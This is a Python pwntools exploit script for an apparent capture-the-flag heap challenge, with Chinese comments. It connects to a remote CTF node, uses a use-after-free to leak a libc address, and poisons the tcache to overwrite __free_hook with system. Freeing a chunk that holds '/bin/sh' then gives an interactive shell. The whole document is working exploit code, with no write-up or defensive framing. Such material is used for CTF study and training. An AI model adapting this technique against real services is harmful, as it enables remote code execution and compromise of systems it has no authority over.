#one_gadget条件限制太多了,打free_hook
from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28799)
# io=process("./vuln")
elf=ELF("./vuln")
libc=ELF("./libc-2.31.so")

def add(n,s):
    io.sendlineafter(b">",b"1")
    io.sendlineafter(b"Index: ",str(n))
    io.sendlineafter(b"Size: ",str(s))

def delete(n):
    io.sendlineafter(b">",b"2")
    io.sendlineafter(b"Index: ",str(n))

def edit(n,cc):
    io.sendlineafter(b">",b"3")
    io.sendlineafter(b"Index: ",str(n))
    io.sendafter(b"Content: ",cc)
    
def show(n):
    io.sendlineafter(b">",b"4")
    io.sendlineafter(b"Index: ",str(n))
    
# gdb.attach(io)    
# pause()
    
for i in range(8):
    add(i,0x80)  
#8块，前7块free填满tcachebin,最后一块free进入unsortedbin
add(8,0x10)
#防止unlink与top_chunk合并
for i in range(8):
    delete(i)
    
show(7) #uaf
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x60-0x1ECB80
print("leak_addr: "+hex(leak_addr))

free_hook=leak_addr+libc.sym[b"__free_hook"]
sys_addr=leak_addr+libc.sym[b"system"]

edit(6,p64(free_hook))
add(9,0x80)
add(10,0x80)
edit(10,p64(sys_addr))

add(11,0x20)
edit(11,b"/bin/sh")
delete(11)

io.interactive()